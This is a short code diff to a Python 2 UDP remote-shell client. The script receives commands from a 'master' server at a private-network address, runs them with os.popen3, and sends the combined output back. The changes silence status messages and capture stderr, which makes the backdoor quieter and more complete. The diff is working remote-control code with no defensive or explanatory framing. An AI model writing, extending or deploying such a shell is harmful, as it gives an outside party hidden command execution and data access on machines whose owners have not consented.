@@ -11,7 +11,7 @@ server_address = ('192.168.56.103', 10000)
 
 def launch():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.sendto('hello master\n', server_address)
+    #s.sendto('hello master\n', server_address)
     return s
 
 s = launch()
@@ -38,19 +38,18 @@ def shell():
             command = command.strip()
             # for debug...
             # print 'got command: ', command
-            if command.strip() == '':
+            if len(command) == 0:
                 continue
             if command.strip().split()[0] == 'cd':
                 os.chdir(command.strip('cd '))
-                s.sendto('Changed Directory\n', server_address)
+                # s.sendto('Changed Directory\n', server_address)
             elif command.strip() == 'goodbye' or command.strip() == 'exit':
-                s.sendto('Goodbye master\n', server_address)
+                s.sendto('Goodbye\n', server_address)
                 s.close()
                 break
             else:
-                proc = os.popen(command)
-                output = proc.read()
-                output = output.strip() + '\n'
+                stdin,stdout,stderr,=os.popen3(command)
+                output=stdout.read()+stderr.read()
                 s.sendto(output, server_address)
             command = ''
         except Exception, e:
